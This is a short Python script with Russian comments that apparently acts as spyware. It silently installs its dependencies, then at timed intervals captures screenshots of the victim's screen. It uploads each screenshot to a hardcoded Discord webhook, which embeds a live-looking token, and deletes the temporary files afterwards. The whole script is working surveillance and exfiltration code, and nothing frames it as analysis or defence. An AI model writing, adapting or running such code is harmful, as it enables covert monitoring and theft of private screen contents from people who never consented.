import pyautogui
import os
import sys
import subprocess
import tempfile
from time import sleep

# Скрытая установка зависимостей
def install_dependencies():
    try:
        import requests
        import pyautogui
    except ImportError:
        # Попытка установить без вывода
        subprocess.check_call([sys.executable, "-m", "pip", "install", 
                              "pyautogui", "requests", "pillow", 
                              "--quiet", "--user"])
        import requests
        import pyautogui

# Основная функция
def main():
    try:
        install_dependencies()
        import requests
        
        # Ваш вебхук (лучше использовать переменную окружения или конфиг)
        discord_webhook = "https://discord.com/api/webhooks/1449862379687903252/Nx7uA0CbDgYwQyrsb2Lm0_gv2loD5_mmTs8AY5v4HlOQRmH3krwBAQnbUKpScdkC9ZrY"
        
        SCREENSHOTS = 3  # Меньше скриншотов
        TIMING = 10      # Больше интервал
        
        for i in range(SCREENSHOTS):
            sleep(TIMING)
            
            # Создаем временный файл
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                screenshot = pyautogui.screenshot()
                screenshot.save(tmp.name)
                
                try:
                    with open(tmp.name, "rb") as f:
                        foto = f.read()
                    
                    # Отправка с таймаутом
                    response = requests.post(
                        discord_webhook,
                        files={"screenshot.png": foto},
                        timeout=10
                    )
                    
                    if response.status_code == 204 or response.status_code == 200:
                        print(f"[+] Скриншот {i+1} отправлен")
                    else:
                        print(f"[-] Ошибка: {response.status_code}")
                        
                except Exception as e:
                    print(f"[-] Ошибка отправки: {e}")
                finally:
                    # Удаляем временный файл
                    os.unlink(tmp.name)
                    
    except Exception as e:
        print(f"Критическая ошибка: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
